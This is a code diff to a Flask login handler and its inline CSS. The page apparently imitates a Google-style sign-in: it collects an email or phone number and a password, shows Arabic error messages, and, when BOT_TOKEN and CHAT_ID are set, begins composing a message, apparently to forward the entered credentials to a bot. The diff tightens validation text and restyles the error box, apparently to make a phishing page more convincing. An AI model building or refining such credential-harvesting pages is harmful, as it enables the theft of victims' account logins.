@@ -19,13 +19,14 @@ def login():
     email_val = request.form.get("email", "").strip()
     password = request.form.get("password", "")
 
-    # الشروط والتحقق من المدخلات وكلمة المرور
-    if not email_val or "@" not in email_val:
+    # الشروط الصارمة للتحقق من البيانات المدخلة
+    if not email_val:
+      error = "الرجاء إدخال البريد الإلكتروني أو رقم الهاتف."
+    elif len(password) < 6:
       error = (
-          "عذراً، يرجى إدخال اسم مستخدم أو بريد إلكتروني صحيح مرتبط بحسابك."
+          "كلمة المرور غير صالحة. يجب أن تتكون كلمة المرور من 6 أحرف أو أرقام"
+          " على الأقل."
       )
-    elif len(password) <= 5:
-      error = "كلمة المرور قصيرة جداً، يجب أن تكون أكثر من 5 أحرف!"
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
@@ -81,7 +82,19 @@ def login():
 
         .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 30px; }
 
-        .error-msg { color: #d93025; font-size: 13px; line-height: 16px; margin-bottom: 15px; width: 100%; text-align: center; font-weight: 500; background: #fce8e6; padding: 10px; border-radius: 4px; border: 1px solid #fad2cf; }
+        .error-msg { 
+            color: #d93025; 
+            font-size: 13px; 
+            line-height: 18px; 
+            margin-bottom: 15px; 
+            width: 100%; 
+            text-align: right; 
+            font-weight: 400; 
+            background: #fce8e6; 
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid #fad2cf; 
+        }
 
         .input-group { width: 100%; margin-bottom: 12px; }
         .input-group input {
